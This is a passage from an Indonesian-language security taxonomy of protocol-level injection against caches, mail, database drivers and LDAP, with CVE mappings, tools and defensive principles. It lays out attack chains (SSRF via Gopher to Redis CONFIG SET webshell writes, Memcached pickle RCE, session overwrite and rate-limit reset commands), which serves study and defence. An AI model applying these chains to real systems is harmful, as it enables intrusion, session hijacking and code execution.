| **CRLF modul http Node.js** | `http.request()` Node.js secara historis mengizinkan CRLF dalam berbagai komponen request. Perbaikan `unicode-characters-in-path` (CVE-2020-7610 dan terkait) menangani karakter rentang Latin-1 tetapi pola bypass tertentu bertahan dalam versi tertentu | Versi Node.js yang terpengaruh; path URL yang dikendalikan pengguna |
| **Injeksi header Go net/http** | Go `net/http` client mengizinkan CRLF injection dalam nilai header dan parameter URL dalam versi tertentu, memungkinkan injeksi HTTP request tambahan atau protocol command ke dalam TCP stream mentah | Versi Go yang terpengaruh; nilai header atau parameter URL yang dikendalikan pengguna |
| **Netty HttpRequestEncoder CRLF** | Konstruktor `DefaultHttpRequest` dan `DefaultFullHttpRequest` Netty menerima URI yang mengandung urutan CRLF tanpa sanitasi. Ketika dikodekan oleh `HttpRequestEncoder`, CRLF yang disuntikkan menyebabkan request smuggling atau protocol command injection (CVE-2025-67735) | Netty < 4.1.129.Final / < 4.2.8.Final; URI yang dikendalikan pengguna |
| **Header injection library Refit** | Atribut `[Header]`, `[HeaderCollection]`, dan `[Authorize]` library Refit C# menggunakan `HttpHeaders.TryAddWithoutValidation`, yang tidak memeriksa karakter CRLF, memungkinkan header injection (CVE-2024-51501) | Library Refit; nilai header yang dikendalikan pengguna |

### §4-2. Delimiter Injection Cache Client Library

Cache client library (pylibmc, php-memcached, node-redis) membangun command Memcached/Redis dari key dan value yang disediakan aplikasi. Escaping delimiter yang tidak memadai dalam library ini menciptakan attack surface protocol injection langsung.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **pylibmc quoted-string CRLF** | Client Memcached Python pylibmc menerima encoding quoted-string RFC2109 dalam parameter key. Ketika session ID dari HTTP cookie mengalir melalui pylibmc, urutan oktal `\015\012` didekode menjadi byte CRLF literal, menciptakan attack surface Memcached command injection yang beroperasi sepenuhnya melalui client library | pylibmc sebagai klien Memcached; Flask-Session atau framework serupa yang menggunakan session key yang berasal dari cookie |
| **Injeksi key ekstensi PHP Memcached** | Ekstensi PHP `Memcached` melakukan sanitasi minimal pada parameter key. Null byte dan CRLF dalam key dapat merusak text protocol command, dengan perilaku tergantung pada versi ekstensi dan konfigurasi tertentu | Ekstensi PHP Memcached; cache key yang dikendalikan pengguna |
| **Injeksi klien redis Node.js** | Versi lama paket npm `redis` membangun inline command dengan string concatenation. Data key atau value yang dikendalikan pengguna yang mengandung urutan CRLF dapat menyuntikkan Redis command tambahan | node-redis sebelum konstruksi command RESP-safe; key/value yang dikendalikan pengguna |
| **Jedis/Lettuce pipeline injection** | Java Redis client yang menggunakan pipelining (mengirimkan beberapa command tanpa menunggu respons) mungkin memiliki jendela race condition di mana command yang disuntikkan dari satu konteks pipeline muncul di konteks lain, terutama di bawah penggunaan ulang connection pool | Redis client pipelining dengan koneksi yang dibagi; aplikasi high-concurrency |

### §4-3. SMTP Client Codec CRLF Injection

SMTP client library dan codec membangun protocol command dari alamat email, subjek, dan header yang disediakan aplikasi. CRLF injection dalam komponen ini memungkinkan injeksi SMTP command sembarang, dengan command yang disuntikkan tampak berasal dari IP server tepercaya — melewati pemeriksaan SPF dan DKIM.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Injeksi command Netty SMTP codec** | SMTP codec Netty (`netty-codec-smtp`) tidak memvalidasi karakter `\r` dan `\n` dalam parameter command yang disediakan pengguna (alamat penerima, data pesan). Urutan CRLF yang disuntikkan membuat SMTP command baru yang dieksekusi oleh MTA penerima sebagai command terpisah yang sah dari server pengirim (CVE-2025-59419) | Netty SMTP codec; alamat penerima/pengirim yang dikendalikan pengguna |
| **Jakarta Mail SMTP injection** | Komponen `jakarta.mail` mengizinkan injeksi SMTP message dengan mengeksploitasi penanganan yang tidak tepat atas karakter `\r` dan `\n` yang dikodekan dalam UTF-8. Penyerang tanpa autentikasi dapat memalsukan pesan SMTP sembarang (CVE-2025-7962) | Jakarta Mail 2.0.2; parameter email yang dikendalikan pengguna |
| **Python smtplib RCPT TO injection** | Python `smtplib` secara historis mengizinkan CRLF dalam alamat `RCPT TO`, memungkinkan injeksi SMTP command sembarang setelah command penerima | Python smtplib; alamat penerima yang dikendalikan pengguna (→ cross-ref `email-smuggling.md` §1-3 untuk konteks SMTP injection yang lebih luas) |

### §4-4. Kelemahan Parsing Level Protokol Database Driver

Database driver menerjemahkan query aplikasi menjadi protocol message wire. Kelemahan dalam penerjemahan ini — khususnya dalam cara driver menangani batas encoding, parameter serialization, dan konstruksi pesan — menciptakan attack surface protocol-level injection yang berbeda dari SQL syntax injection (→ cross-ref `jdbc-attack.md` untuk injeksi parameter connection URL).

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **PostgreSQL JDBC preferQueryMode=SIMPLE** | Driver PostgreSQL JDBC dalam simple query mode menggabungkan parameter langsung ke dalam string SQL yang dikirimkan via simple query message wire protocol, melewati jalur prepared statement yang menyediakan parameterisasi (CVE-2024-1597, CVSS 10.0) | PostgreSQL JDBC dengan `preferQueryMode=SIMPLE`; aplikasi yang menggunakan mode ini untuk kompatibilitas |
| **Pemecahan protocol message wire pgx** | Seperti dijelaskan dalam §2-1: kalkulasi ukuran 32-bit driver Go pgx menyebabkan korupsi message framing, memungkinkan injeksi protocol message (CVE-2024-27304) | Nilai parameter besar yang dikendalikan pengguna; driver pgx |
| **MySQL Connector autoDeserialize** | MySQL Connector/J dengan `autoDeserialize=true` men-deserialkan hasil BLOB dari `SHOW SESSION STATUS` menjadi objek Java, memungkinkan eksekusi gadget chain (→ cross-ref `jdbc-attack.md` §1 untuk analisis rantai lengkap) | JDBC URL yang dikendalikan penyerang atau koneksi yang mencapai server MySQL berbahaya |

---

## §5. Data Manipulation & Exfiltration Level Protokol

Di luar command injection, serangan level protokol dapat memanipulasi data yang disimpan oleh atau ditransmisikan melalui layanan — meracuni cache, mengkorupsi sesi, menyuntikkan objek yang terserialisasi, dan membocorkan isi memori melalui bug level protokol.

### §5-1. Cache Entry Poisoning & Session Store Manipulation

Ketika primitive protocol injection (§1, §3, §4) mengizinkan penulisan pasangan key-value sembarang, dampak paling langsung adalah manipulasi data layer aplikasi — session store, authentication cache, rate limit counter, dan feature flag.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Overwrite nilai session ID** | Memcached/Redis command injection ke `SET session:<target_sid> <attacker_session_data>` menggantikan sesi korban dengan data sesi yang dikendalikan penyerang, mencapai session hijacking tanpa memerlukan kredensial autentikasi korban | Primitive protocol injection; pengetahuan tentang format session key (biasanya `session:UUID`) |
| **Reset counter rate limit** | `SET ratelimit:<target_ip> 0` atau `DEL ratelimit:<target_key>` mereset rate limiting counter, memungkinkan serangan brute-force yang sebelumnya di-throttle | Protocol injection; pengetahuan tentang format rate limit key |
| **Manipulasi feature flag** | `SET feature:admin_panel true` atau manipulasi key-value serupa dapat mengaktifkan/menonaktifkan feature flag aplikasi yang disimpan dalam Redis/Memcached, memungkinkan akses ke fitur administratif | Protocol injection; pengetahuan tentang skema feature flag key |
| **Cache poisoning untuk manipulasi respons** | Menyuntikkan nilai yang dibuat khusus ke dalam entri cache aplikasi menyebabkan aplikasi menyajikan konten yang dikendalikan penyerang kepada pengguna lain saat cache hit — secara efektif serangan server-side cache poisoning yang beroperasi di level data store daripada level HTTP cache | Protocol injection; pengetahuan tentang skema cache key; konten yang di-cache disajikan ke pengguna lain |
| **Manipulasi stream XDEL/XADD** | Redis Stream (`XADD`, `XDEL`, `XRANGE`) yang digunakan untuk event queue dapat dimanipulasi via command injection untuk menyuntikkan event palsu, menghapus event yang sah, atau membaca event dari consumer lain | Protocol injection; Redis Stream digunakan untuk pemrosesan event aplikasi |

### §5-2. Serialized Object Injection via Protocol Channel

Banyak framework menyimpan objek yang terserialisasi (Python pickle, PHP serialize, objek Java yang terserialisasi, Ruby Marshal) dalam Memcached atau Redis sebagai data sesi, hasil komputasi yang di-cache, atau entri job queue. Protocol injection yang menulis ke key ini memungkinkan **serangan deserialisasi** melalui protocol channel.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Pickle injection via Memcached** | Flask-Session dengan backend Memcached menyimpan sesi sebagai objek Python pickle. Memcached command injection (§1-2) menulis payload pickle berbahaya ke session key korban. Ketika aplikasi memuat sesi, `pickle.loads()` mengeksekusi kode penyerang via `__reduce__` (pola CVE-2021-33026) | Flask-Session + Memcached + pylibmc; CRLF injection dalam session ID → Memcached command injection → pickle RCE |
| **PHP unserialize via Redis/Memcached** | Aplikasi PHP yang menggunakan `serialize()`/`unserialize()` untuk data sesi yang disimpan dalam Redis atau Memcached. Protocol injection menulis objek PHP yang terserialisasi yang dibuat khusus yang mengandung property-oriented programming (POP) gadget chain | PHP session handler menggunakan Redis/Memcached; POP gadget chain yang diketahui dalam aplikasi atau framework |
| **Ruby Marshal via Redis** | Aplikasi Ruby on Rails yang menggunakan Redis sebagai session store dengan serialisasi Marshal. Command injection menulis payload Marshal berbahaya yang memicu eksekusi kode saat deserialisasi (rantai serangan GitHub Enterprise milik Orange Tsai) | Rails + Redis session store + serialisasi Marshal; primitive protocol injection |
| **Java deserialisasi via Redis** | Aplikasi Java yang menyimpan objek terserialisasi dalam Redis (mis. Spring Session dengan Redis). Objek yang disuntikkan memicu gadget chain (Commons Collections, dll.) saat deserialisasi | Aplikasi Java + Redis + serialisasi Java; gadget chain yang diketahui dalam classpath |

### §5-3. Information Disclosure Level Protokol

Bug level protokol dapat membocorkan data sensitif dari memori server, connection state, atau konfigurasi tanpa memerlukan akses yang diautentikasi.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Pengungkapan heap memory MongoDB (MongoBleed)** | Seperti dijelaskan dalam §2-2: mengeksploitasi ketidakcocokan `uncompressedSize` OP_COMPRESSED untuk membaca heap memory yang tidak diinisialisasi yang berisi kredensial, API key, session token, dan PII (CVE-2025-14847, CVSS 7.5/8.7, CISA KEV, aktif dieksploitasi, public PoC) | MongoDB dengan kompresi; akses jaringan tanpa autentikasi |
| **Info leak Redis DEBUG OBJECT** | `DEBUG OBJECT key` mengungkap encoding internal, refcount, ukuran serialisasi, dan informasi LRU. Dikombinasikan dengan `KEYS *` atau `SCAN`, ini menyediakan inventaris lengkap konten dan metadata data store | Redis tanpa ACL yang membatasi command DEBUG |
| **Informasi koneksi Redis CLIENT LIST** | `CLIENT LIST` mengungkap alamat IP, port, nama koneksi, dan command yang sedang dieksekusi dari semua klien yang terhubung — memungkinkan rekognisi arsitektur internal aplikasi | Redis tanpa ACL yang membatasi command CLIENT |
| **Information disclosure stats Memcached** | Command `stats`, `stats items`, `stats cachedump` Memcached mengungkap nama key, ukuran, dan pola akses. `stats` sendiri mengungkap versi, uptime, jumlah koneksi, dan penggunaan memori | Memcached tanpa autentikasi (konfigurasi default) |
| **Kebocoran informasi pesan error protokol** | Respons error dari Redis (`-ERR`), Memcached (`ERROR`, `CLIENT_ERROR`), dan layanan lain dapat mengungkap informasi versi, detail konfigurasi, dan state internal. Sengaja memicu error melalui command yang salah format adalah teknik enumerasi | Protokol layanan apa pun yang dapat dijangkau; tidak diperlukan autentikasi untuk pemicu error |

### §5-4. Protocol Amplification & Reflection

Protokol layanan dapat dipersenjatai untuk serangan amplifikasi jaringan dengan mengeksploitasi asimetri antara request kecil dan respons besar, atau dengan menggunakan protocol command yang mengalihkan respons ke target pihak ketiga.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Amplifikasi UDP Memcached** | Protokol UDP Memcached mengirimkan respons tanpa memverifikasi IP sumber. Request `stats` kecil (15 byte) dapat menghasilkan respons melebihi 100KB, mencapai rasio amplifikasi 10.000–51.000x. Ini mendukung serangan DDoS terbesar yang pernah ada pada 2018 (1,35 Tbps terhadap GitHub) | Memcached dengan UDP diaktifkan (port 11211); IP sumber yang dapat di-spoof |
| **Redis SUBSCRIBE/PSUBSCRIBE amplification** | `SUBSCRIBE channel` membuat koneksi persisten yang menerima semua pesan yang dipublikasikan ke channel. Penyerang yang subscribe ke pola wildcard (`PSUBSCRIBE *`) menerima semua traffic pub/sub dalam instance Redis | Redis tanpa ACL; pub/sub digunakan untuk komunikasi antar layanan |
| **Amplifikasi DNS via protocol injection** | Ketika protocol injection memungkinkan command DNS lookup (mis. `DEBUG SLEEP` Redis dengan strace yang menampilkan resolusi DNS, atau DNS lookup level aplikasi yang dipicu oleh nilai cache yang disuntikkan), resolusi DNS dapat diarahkan ke server autoritatif yang dikendalikan penyerang untuk data exfiltration | Protocol injection dengan efek samping resolusi DNS; DNS eksternal dapat dijangkau |

---

## §6. Connection Initialization & Authentication Protocol Attack

Fase inisialisasi koneksi dan autentikasi protokol layanan menghadirkan attack surface yang unik — injeksi parameter connection string, manipulasi authentication handshake, dan ekstraksi kredensial melalui interaksi level protokol.

### §6-1. Connection String Parameter Pollution

Konfigurasi aplikasi yang membangun connection string layanan dari data yang sebagian dikendalikan pengguna (environment variable, file konfigurasi, parameter URL) rentan terhadap parameter injection yang mengubah perilaku koneksi.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Injeksi parameter Redis URL** | Connection URL Redis (`redis://host:port/db?param=value`) menerima parameter yang memodifikasi perilaku klien. Menyuntikkan parameter tambahan via manipulasi URL parsing dapat mengubah target database, mengaktifkan/menonaktifkan TLS, atau memodifikasi kredensial autentikasi | Aplikasi yang membangun Redis URL dari input yang sebagian dikendalikan pengguna |
| **Injeksi server list Memcached** | Connection string yang mencantumkan beberapa server Memcached dapat dimanipulasi untuk menambahkan server yang dikendalikan penyerang. Klien mendistribusikan key di semua server, mengirimkan sebagian operasi cache (termasuk data sesi sensitif) ke server penyerang | Aplikasi yang membangun server list Memcached dari input yang dapat dikonfigurasi |
| **Injeksi connection string MongoDB** | MongoDB connection URI menerima banyak parameter (`authMechanism`, `tlsAllowInvalidCertificates`, `replicaSet`). Menyuntikkan parameter dapat men-downgrade autentikasi, menonaktifkan validasi sertifikat TLS, atau mengalihkan klien untuk bergabung dengan replica set berbahaya | Aplikasi yang membangun MongoDB URI dari input yang sebagian dikendalikan pengguna |
| **Injeksi parameter JDBC URL** | Seperti yang dijelaskan secara ekstensif dalam `jdbc-attack.md` §10: JDBC URL menerima parameter spesifik driver yang mengaktifkan deserialisasi (`autoDeserialize`), file read (`loggerFile`), instansiasi kelas (`socketFactory`), dan JNDI injection (`clientRerouteServerListJNDIName`). Subbagian ini melakukan cross-reference daripada menduplikasi cakupan tersebut | (→ cross-ref `jdbc-attack.md` §1–§10 untuk attack surface JDBC lengkap) |

### §6-2. Authentication Handshake Exploitation

Mekanisme autentikasi protocol layanan dapat dieksploitasi melalui timing attack, credential sniffing, atau manipulasi handshake.

| Subtipe | Mekanisme | Kondisi Kunci |
|---|---|---|
| **Timing command Redis AUTH** | Redis AUTH menggunakan perbandingan string sederhana. Redis sebelum versi 6.0 tidak memiliki perlindungan brute-force (tidak ada lockout, tidak ada delay). Dikombinasikan dengan inline command injection, penyerang dapat menyuntikkan command `AUTH password_guess\r\n` untuk brute-force kredensial | Redis dengan autentikasi password; primitive protocol injection |
| **Memcached SASL downgrade** | Memcached mendukung autentikasi SASL sebagai fitur opsional. Jika klien tidak menegakkan SASL dan penyerang dapat melakukan MITM atau inject selama setup koneksi, autentikasi dapat dilewati sepenuhnya | Memcached dengan SASL opsional; injection level jaringan |
| **MongoDB SCRAM-SHA-1/256 downgrade** | MongoDB mendukung beberapa mekanisme autentikasi. Jika klien mengizinkan negosiasi mekanisme, penyerang dalam posisi MITM dapat men-downgrade dari SCRAM-SHA-256 ke SCRAM-SHA-1 yang lebih lemah atau bahkan MONGODB-CR (deprecated, menggunakan MD5) | MongoDB dengan beberapa mekanisme auth; posisi MITM |
| **Bypass Redis ACL command injection** | Redis 6.0+ ACL membatasi command per pengguna. Namun, jika protocol injection terjadi melalui koneksi yang diautentikasi sebagai pengguna yang memiliki hak akses (mis. connection pool milik aplikasi sendiri), command yang disuntikkan dieksekusi dengan hak akses aplikasi, melewati pembatasan ACL per pengguna | Protocol injection melalui connection pool yang diautentikasi milik aplikasi |

---

## §7. Pemetaan Attack Scenario (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama | Contoh Rantai |
|---|---|---|---|
| **Cache Poisoning → Session Hijack** | Web app + session store Memcached/Redis | §1-1/§1-2 + §5-1 + §5-2 | CRLF dalam session key → Memcached command injection → overwrite sesi korban → deserialisasi pickle RCE |
| **Pivoting Layanan Internal → RCE** | SSRF + Redis internal | §3-3/§3-4 + §1-1 + §1-1 (CONFIG) | SSRF via Gopher → Redis CRLF injection → CONFIG SET dir/dbfilename → penulisan webshell |
| **Data Exfiltration / Heap Leak** | Port database yang terekspos | §2-2 + §5-3 | OP_COMPRESSED yang dibuat khusus → heap memory leak MongoDB → ekstraksi kredensial/API key/PII (MongoBleed) |
| **Authentication Bypass** | Aplikasi dengan auth berbasis cache | §1-1/§1-2 + §5-1 | Protocol injection → overwrite entri auth cache → bypass validasi kredensial |
| **Wire Protocol SQL Injection** | Aplikasi dengan PostgreSQL/MongoDB | §2-1 + §4-4 | Parameter besar → pgx overflow 32-bit → pesan Query yang disuntikkan → SQL sembarang (CVE-2024-27304) |
| **Browser-to-Internal-Service** | Pengguna yang browsing + layanan lokal yang terekspos | §3-2 + §1-1 | Halaman web berbahaya → DNS rebinding → fetch() ke localhost:6379 → Redis command injection |
| **Deserialisasi RCE via Protokol** | Flask + Memcached + pickle | §1-2 + §4-2 + §5-2 | pylibmc CRLF → Memcached set → objek pickle berbahaya → aplikasi memuat sesi → \_\_reduce\_\_ → RCE |
| **DDoS Amplification** | Memcached UDP yang terekspos | §5-4 | IP sumber yang di-spoof → request stats Memcached → respons yang diamplifikasi 51.000x ke korban (1,35 Tbps) |
| **Supply Chain Cache Poisoning** | Caching layer yang dibagi | §1-1/§1-2 + §5-1 | Protocol injection ke dalam cache yang dibagi → metadata library/paket yang diracuni → konsumen downstream menarik data berbahaya |

---

## Pemetaan CVE / Bounty (2019–2025)

| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
|---|---|---|
| §2-1 (pgx message overflow) | CVE-2024-27304 (Go pgx/pgproto3) | **CVSS Critical.** Korupsi wire protocol message framing → SQL injection di level protokol. Presentasi DEF CON 32. |
| §2-1 (pgx simple protocol) | CVE-2024-27289 (Go pgx v4) | SQL injection via pola parameter protokol sederhana. |
| §4-4 (PostgreSQL JDBC) | CVE-2024-1597 (PostgreSQL JDBC) | **CVSS 10.0.** SQL injection preferQueryMode=SIMPLE; memengaruhi Keycloak dan ratusan aplikasi Java. |
| §2-1 + §4-4 (psql UTF-8) | CVE-2025-1094 (PostgreSQL psql) | **Aktif dieksploitasi.** Dirantai dalam pelanggaran BeyondTrust yang memengaruhi 17+ pelanggan enterprise termasuk US Treasury. |
| §2-2 (kompresi MongoDB) | CVE-2025-14847 (MongoDB, "MongoBleed") | **CVSS 7.5 (v3.1) / 8.7 (v4.0). CISA KEV. Aktif dieksploitasi.** Heap memory disclosure tanpa autentikasi; 213K+ instance yang terekspos. Public PoC. |
| §2-3 (FastCGI overflow) | CVE-2025-23016 (libfcgi) | Integer overflow dalam parsing parameter → heap overflow → RCE pada sistem 32-bit. |
| §2-3 (argument injection PHP-CGI) | CVE-2024-4577 (PHP-CGI Windows) | **CVSS 9.8. Aktif dieksploitasi.** PHP-CGI argument injection via Windows Best-Fit character mapping. Eksploitasi luas pada 2025. |
| §4-1 (CRLF HTTP Netty) | CVE-2025-67735 (Netty HttpRequestEncoder) | CRLF injection dalam URI → HTTP request smuggling atau cross-protocol injection. |
| §4-3 (CRLF SMTP Netty) | CVE-2025-59419 (Netty SMTP codec) | SMTP command injection → pemalsuan email yang melewati pemeriksaan SPF/DKIM dari IP tepercaya. |
| §4-3 (Jakarta Mail SMTP) | CVE-2025-7962 (Jakarta Mail 2.0.2) | SMTP injection via CR/LF yang dikodekan UTF-8 → pemalsuan email sembarang. |
| §4-1 (injeksi header Refit) | CVE-2024-51501 (library Refit) | CRLF injection dalam atribut Header/Authorize → request smuggling. |
| §4-3 (SMTP VMware vCenter) | CVE-2025-41250 (VMware vCenter) | SMTP header injection dalam notifikasi scheduled task → BCC injection, perubahan subjek. |
| §5-2 (pickle injection Memcached) | CVE-2021-33026 (Flask-Session) | Pickle deserialization RCE via Memcached command injection melalui cookie Flask-Session. |
| §1-4 (RCE protokol LDAP) | CVE-2024-49112 (Windows LDAP) | **CVSS 9.8.** RCE tanpa autentikasi via panggilan LDAP yang dibuat khusus. |
| §1-4 (DoS protokol LDAP) | CVE-2024-49113 (Windows LDAP, "LDAPNightmare") | **CVSS 7.5.** DoS tanpa autentikasi via respons LDAP yang salah format; public PoC. |
| §6-2 (bypass auth NTLM LDAP) | CVE-2025-54918 (Windows LDAP) | NTLM LDAP authentication bypass → privilege escalation. |
| §1-2 + §5-2 (Memcached + pickle) | CTF: Cyber Apocalypse 2024 "SerialFlow" | Edukatif: rantai Flask-Session + Memcached CRLF → pickle RCE. |
| §3-2 (DNS rebinding → MCP) | CVE-2025-66416 (MCP Python SDK) | DNS rebinding ke server MCP lokal → pemanggilan tool → potensi RCE. |
| §1-1 (Redis via GitHub Enterprise) | Rantai GitHub Enterprise milik Orange Tsai ($18.000) | SSRF → CRLF injection dalam urllib → Redis → deserialisasi Ruby Marshal → RCE. **Bounty $18.000.** |
| §5-4 (amplifikasi UDP Memcached) | DDoS GitHub 2018 (1,35 Tbps) | Serangan DDoS terbesar pada masanya; faktor amplifikasi UDP Memcached 51.000x. |

---

## Alat Deteksi

| Alat | Cakupan Target | Teknik Inti |
|---|---|---|
| **Gopherus** (Python, open-source) | §1-1, §1-2, §3-3 Redis/Memcached/MySQL/FastCGI | Menghasilkan payload Gopher untuk protocol injection via SSRF; mendukung Redis CONFIG, Memcached set, query MySQL, parameter FastCGI |
| **redis-rogue-server** (Python) | §1-1 replikasi Redis | Mengimplementasikan master Redis berbahaya untuk RCE berbasis module loading via SLAVEOF |
| **redis-cli** (bawaan Redis) | §1-1, §5-3, §6-2 pengujian protokol Redis | Interaksi protokol langsung untuk menguji command injection, autentikasi, dan information disclosure |
| **memccat/memcstat** (libmemcached) | §1-2, §5-3 pengujian Memcached | Alat klien Memcached untuk menguji interaksi protokol, enumerasi key, dan pengungkapan stats |
| **SSRFmap** (Python, open-source) | §3-3, §3-4 SSRF multi-protokol | Eksploitasi SSRF otomatis dengan payload spesifik protokol untuk Redis, Memcached, FastCGI, MySQL, SMTP |
| **MongoBleed scanner** (Python, GitHub) | §2-2, §5-3 heap leak MongoDB | Scanner khusus untuk CVE-2025-14847; menguji eksploitasi OP_COMPRESSED untuk heap memory disclosure |
| **Nuclei** (Go, ProjectDiscovery) | §1-1, §1-2, §2-3, §6-1 multi-protokol | Scanner template YAML dengan template protocol injection Redis, Memcached, FastCGI, dan MongoDB |
| **sqlmap** (Python, open-source) | §2-1, §4-4 database wire protocol | Alat SQL injection yang dapat mendeteksi dan mengeksploitasi jalur protocol-level injection (PostgreSQL JDBC, preferQueryMode) |
| **Singularity** (Go, NCC Group) | §3-2 DNS rebinding | Framework serangan DNS rebinding untuk menguji protocol injection browser-ke-layanan-internal |
| **libfuzzer / AFL++** (C/C++) | §2-1, §2-2, §2-3 parsing binary protocol | Coverage-guided fuzzing implementasi protocol parser (FastCGI, RESP, MongoDB wire protocol) |
| **Burp Suite** (Java, PortSwigger) | §4-1, §4-2, §6-1 injection termediasi HTTP | HTTP proxy dengan deteksi CRLF injection; Collaborator untuk verifikasi out-of-band protocol injection |
| **crackmapexec** (Python) | §1-4, §6-2 auth multi-layanan | Pengujian autentikasi dan enumerasi multi-protokol untuk Redis, LDAP, dan layanan lainnya |

---

## Ringkasan: Prinsip Inti

### Mengapa Protocol-Level Injection Bertahan

Protocol-level injection bertahan karena **ketidakcocokan fundamental antara asumsi kepercayaan protokol layanan dan realitas konteks deployment mereka**:

1. **Kesederhanaan delimiter sebagai attack surface.** Text-based service protocol (Redis RESP, Memcached, FTP, SMTP) menggunakan CRLF sebagai terminator command sekaligus delimiter data. Kesederhanaan ini — fitur untuk debugging yang mudah dibaca manusia dan interoperabilitas — menjadi kerentanan ketika data yang tidak tepercaya berbagi channel yang sama dengan command. Tidak seperti HTTP, yang telah mengembangkan mekanisme framing kompleks (Content-Length, Transfer-Encoding, HTTP/2 frame) secara khusus untuk membedakan header dari body, protokol layanan mengandalkan jaminan out-of-band (jaringan tepercaya, klien yang diautentikasi) yang tidak berlaku dalam arsitektur cloud modern di mana layanan dapat dijangkau via SSRF, jaringan yang dibagi, atau bug client library.

2. **Binary protocol mempercayai framing mereka sendiri.** Binary protocol (PostgreSQL wire protocol, MongoDB wire protocol, FastCGI) menggunakan pesan length-prefixed yang seharusnya kebal terhadap delimiter injection. Namun, mereka mempercayai metadata framing (field ukuran, header kompresi) yang disediakan oleh pengirim. Ketika client library menghitung field ini dengan aritmatika integer yang dapat overflow (field ukuran 32-bit dengan payload >4GB), atau ketika compression layer menerima ukuran yang dideklarasikan tanpa validasi (MongoBleed), framing itu sendiri menjadi vektor injection — dan konsekuensinya parah karena protokol tidak memiliki mekanisme validasi sekunder.

3. **Tolerant parsing memungkinkan cross-protocol attack.** Layanan yang dirancang untuk lingkungan tepercaya mem-parse input secara permisif — menerima apa yang dapat mereka pahami dan membuang yang tidak bisa. Pemrosesan baris demi baris Redis, penanganan error per command Memcached, dan perilaku serupa berarti bahwa request yang salah format (HTTP POST ke Redis, payload DNS rebinding) tidak ditolak secara keseluruhan. Sebaliknya, command yang valid yang disematkan dalam noise diekstrak dan dieksekusi. Toleransi ini, meskipun ramah pengguna untuk debugging, mengubah setiap protokol menjadi target cross-protocol injection yang potensial.

### Mengapa Perbaikan Inkremental Gagal

Setiap kelas protocol injection telah mengalami siklus patch-bypass yang khas:

- **Redis menambahkan aliasing POST/Host: → QUIT** (3.2.7) untuk memblokir serangan cross-protocol berbasis HTTP — di-bypass dengan menggunakan vektor non-HTTP (WebSocket, DNS rebinding, skema DICT) atau dengan membuat HTTP request yang tidak dimulai dengan POST/Host:
- **Python memperbaiki CRLF urllib** (CVE-2019-9740) — bug serupa muncul kembali di Node.js, Go, Netty (CVE-2025-67735), dan Refit (CVE-2024-51501) karena setiap library mengimplementasikan konstruksi HTTP message secara independen
- **pgx menambahkan validasi ukuran request** untuk overflow wire protocol — dapat di-bypass via koneksi WebSocket, kompresi HTTP, dan endpoint alternatif
- **Memcached memperkenalkan autentikasi SASL** — opsional, jarang digunakan, dan tidak melindungi terhadap injection melalui koneksi aplikasi yang diautentikasi

Polanya konsisten: **pertahanan yang diterapkan pada protocol boundary dilewati dengan menemukan jalur baru ke boundary tersebut** (client library baru, mekanisme pengiriman baru, fitur protokol baru).

### Seperti Apa Solusi Struktural

Pertahanan yang efektif memiliki arsitektur umum: **memisahkan command channel dari data channel**:

- **RESP3 binary-safe protocol**: Protokol RESP3 Redis menggunakan binary string length-prefixed untuk semua data, menghilangkan inline command parsing. Aplikasi yang menggunakan RESP3 secara eksklusif kebal terhadap CRLF-based command injection — tetapi hanya jika client library secara konsisten menggunakan RESP3 dan tidak pernah fallback ke mode inline
- **Prepared statement di level protokol**: Extended query protocol PostgreSQL memisahkan SQL dari parameter dalam protocol message yang berbeda. Riset DEF CON 32 menunjukkan bahwa driver yang menggunakan simple query protocol (yang menggabungkan SQL dan parameter dalam satu pesan) memperkenalkan kembali injection — perbaikan struktural adalah pemisahan yang ditegakkan oleh protokol
- **Authentication + ACL sebagai defense-in-depth**: ACL Redis 6.0+ membatasi command mana yang dapat dieksekusi setiap pengguna. Bahkan ketika injection terjadi melalui koneksi aplikasi, ACL dapat mencegah command berbahaya (CONFIG, MODULE, DEBUG, SLAVEOF) — mengurangi blast radius dari RCE ke manipulasi data
- **Network isolation**: Pertahanan paling efektif terhadap cross-protocol attack adalah memastikan protokol layanan tidak pernah dapat dijangkau dari konteks yang tidak tepercaya — tidak ada binding ke 0.0.0.0, tidak ada eksposur ke jaringan yang dapat dijangkau SSRF, tidak ada ketergantungan pada filtering level aplikasi. Unix domain socket menghilangkan attack surface TCP sepenuhnya
- **Client library hardening**: Validasi CRLF sistematis pada layer konstruksi protocol message (bukan pada layer input aplikasi) mencegah injection terlepas dari mekanisme pengiriman. Perbaikan CVE-2025-67735 Netty (menambahkan `HttpUtil.validateRequestLineTokens`) adalah model untuk pendekatan ini

Ketegangan fundamental adalah bahwa kesederhanaan protokol memungkinkan injection: mode command inline Redis ada untuk kemudahan debugging, protokol teks Memcached ada untuk keterbacaan manusia, dan binary protocol mempercayai framing yang dihitung klien untuk performa. Solusi struktural mengharuskan pengorbanan kesederhanaan ini — menegakkan binary framing, autentikasi wajib, dan validasi input ketat di setiap protocol boundary.

---

## Referensi

- Paul Gerste (SonarSource): "SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level" — DEF CON 32, 2024 — https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf
- Ivan Novikov: "The New Page of Injections Book: Memcached Injections" — Black Hat USA 2014 — https://blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf
- Akamai: "CVE-2025-14847: All You Need to Know About MongoBleed" — https://www.akamai.com/blog/security-research/cve-2025-14847-all-you-need-to-know-about-mongobleed
- Wiz: "MongoBleed: Critical MongoDB Vulnerability CVE-2025-14847" — https://www.wiz.io/blog/mongobleed-cve-2025-14847-exploited-in-the-wild-mongodb
- Unit42: "Threat Brief: MongoDB Vulnerability (CVE-2025-14847)" — https://unit42.paloaltonetworks.com/mongobleed-cve-2025-14847/
